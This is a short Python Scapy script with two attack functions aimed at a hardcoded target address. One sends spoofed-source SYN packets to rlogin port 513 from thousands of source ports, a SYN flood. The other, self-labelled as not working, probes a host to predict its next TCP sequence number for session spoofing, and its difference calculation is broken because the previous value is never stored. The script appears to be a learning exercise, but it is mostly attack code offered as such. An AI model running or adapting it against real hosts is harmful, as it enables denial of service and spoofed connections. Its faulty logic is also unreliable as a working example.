from scapy.all import *

def SynFlood(src, tgt):
    print("[+] Started Syn Flooding")
    # for each port
    for port in range(1024, 65535):
        # SIP and DSTIP
        ip = IP(src=src, dst=tgt)
        tcp = TCP(sport=port, dport=513)
        pkt = ip / tcp
        send(pkt)


# DOESNT WORK !!!
def calSyn(tgt):
    # first we will send a TCP SYN then wait for the ACK [print ACK]
    # 4 packets to comfirm it exist
    seqNum = 0
    preNum = 0
    diffSeq = 0
    for x in range(1,5):
        if preNum != 0:
            preNum = preNum
        pkt = IP(dst=tgt) / TCP()
        print("[+] Sent a packet")
        ans = sr1(pkt,verbose=0, timeout=2)
        print("[+] SR1")
        seqNum=ans.getlayer(TCP).seq
        print("[+] Getting a sequence Number")
        diffSeq = seqNum - preNum
        print(f"[+] TCP Seq Difference: {diffSeq}")
    # will return the next sequence
    return seqNum + diffSeq


src = '10.10.10.10'
tgt='192.168.0.20'
x=calSyn(tgt)
print(f"[+] Next TCP Sequence Number to ACK is {str(x)}")
